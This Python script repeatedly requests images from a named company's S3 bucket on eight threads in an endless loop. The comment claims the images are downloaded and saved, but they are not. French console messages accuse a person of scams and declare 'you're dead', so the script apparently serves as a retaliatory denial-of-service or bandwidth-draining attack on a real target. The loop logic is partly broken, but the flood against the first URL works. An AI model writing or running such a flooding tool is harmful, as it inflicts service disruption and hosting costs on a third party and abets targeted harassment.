import requests
import threading
import os
from sys import stdout
from time import sleep

url_index = 0

urls = [
'https://upfollowcreators.s3.us-east-2.amazonaws.com/settings/January2024/QrugMjtC5qfOBrMooGBq.png',
'https://upfollowcreators.s3.us-east-2.amazonaws.com/users/avatar/4b24f2cd50cb41fe843f3e7e4068d028.jpg',
'https://upfollowcreators.s3.us-east-2.amazonaws.com/users/avatar/717dced651524731baca6b4ffa76c96c.jpg',
'https://upfollowcreators.s3.us-east-2.amazonaws.com/users/avatar/9d11894cf20e4ed6b476b5f825e15602.png',
'https://upfollowcreators.s3.us-east-2.amazonaws.com/users/avatar/79776ab7d7594f72bff971e7dafd19f3.png',
'https://upfollowcreators.s3.us-east-2.amazonaws.com/users/avatar/3901ac8f46bc4ed8a7779a9e1522fc65.jpg',
'https://upfollowcreators.s3.us-east-2.amazonaws.com/users/avatar/0e7e64afb721422facc1f03fe411ec9e.jpg',
'https://upfollowcreators.s3.us-east-2.amazonaws.com/users/avatar/e34466d2380e4118b8d767c517d16ffc.jpg',
'https://upfollowcreators.s3.us-east-2.amazonaws.com/users/avatar/c804e1aa843842e6b00beee25bbff297.jpg',
'https://upfollowcreators.s3.us-east-2.amazonaws.com/users/avatar/95c46130719d46308546337952d8acfc.jpg'
        ]

# Function to download and save an image from a URL
def download_image(thread_id, url):
    i = 0
    while True:
        try:
            response = requests.get(url)
            if response.status_code == 200:
                pass
            elif response.status_code == 500:
                pass
            elif response.status_code == 443:
                return 'next'
            else:
                print(response.status_code)
        except Exception as e:
            print(f"Error downloading image: {e}")
        i += 1
        if i % 100 == 0:
            print('-', end='')
            stdout.flush()


# Create and start a thread for each image download
print('Ha lala, ce bon vieux cemcem, il devient quoi ?')
sleep(3)
print('Attends mais... Il douille un peu les gens quand meme nan ?')
sleep(3)
print('WTF... C\'est quoi toutes ces arnaques la ??')
sleep(3)
print('CEMCEM...')
sleep(2)
print('TES MOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOORT !!!!!!!!!!!!!!')
sleep(1)

url = 0
while True:
    nb_threads = 8
    threads = []
    for thread_id in range(nb_threads):
        thread = threading.Thread(target=download_image, args=(thread_id, urls[url]))
        thread.start()
        threads.append(thread)

    print('Script launched properly')

    # Wait for all threads to complete
    for thread in threads:
        thread.join()

    url_index = (url_index + 1) if url_index < len(urls) - 1 else 0
